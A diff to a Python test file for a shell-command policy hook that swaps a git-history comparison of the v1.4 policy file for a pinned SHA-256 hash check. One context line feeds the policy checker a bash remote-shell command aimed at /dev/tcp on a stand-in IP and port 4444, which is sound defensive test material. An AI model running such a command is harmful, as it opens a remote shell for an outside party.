@@ -159,11 +159,15 @@ def test_no_shell_execution(monkeypatch):
     decision('bash -c "exec 3>$(printf %s /dev/tcp/203.0.113.5/4444)"', "POL-07:REMOTE_SHELL")
 
 
+# SHA-256 of receiptd/hooks/v1_4.policy.json as published (commit 4e26fda).
+# Pinned by hash so the check does not need git history (CI uses shallow clones).
+V1_4_POLICY_SHA256 = "c9fd69adface00228222bdd9e8a6c3164558725d74c30787c8b4e647e1b5b66a"
+
+
 def test_policy_bytes_remain_pinned():
     # Published v1.4 policy stays byte-identical; v1.5 is an explicit candidate.
-    import subprocess
-    original = subprocess.check_output(["git", "show", "4e26fda:receiptd/hooks/v1_4.policy.json"], cwd=ROOT)
-    assert (ROOT / "receiptd/hooks/v1_4.policy.json").read_bytes() == original
+    data = (ROOT / "receiptd/hooks/v1_4.policy.json").read_bytes()
+    assert hashlib.sha256(data).hexdigest() == V1_4_POLICY_SHA256
 
 
 @pytest.mark.parametrize("command", [
